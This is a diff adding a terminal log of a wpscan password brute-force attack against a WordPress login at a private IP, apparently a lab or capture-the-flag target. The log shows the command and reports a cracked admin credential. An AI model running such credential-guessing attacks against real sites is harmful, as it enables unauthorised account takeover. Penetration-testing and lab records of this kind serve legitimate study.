@@ -1,0 +1,28 @@
+$ wpscan --url http://10.129.41.87/ --usernames admin,editor_j --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 20
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.25
+_______________________________________________________________
+
+[+] URL: http://10.129.41.87/ [10.129.41.87]
+[+] Started: Wed Sep 17 11:20:55 2026
+
+[+] Performing password attack on Wp Login against 2 user/s
+[SUCCESS] - admin / Summer2023!
+Trying editor_j / qwerty Time: 00:03:41 <====                > (3120 / 28671)  10.88%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: admin, Password: Summer2023!
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+
+[+] Finished: Wed Sep 17 11:24:38 2026
+[+] Requests Done: 3121
+[+] Elapsed time: 00:03:43
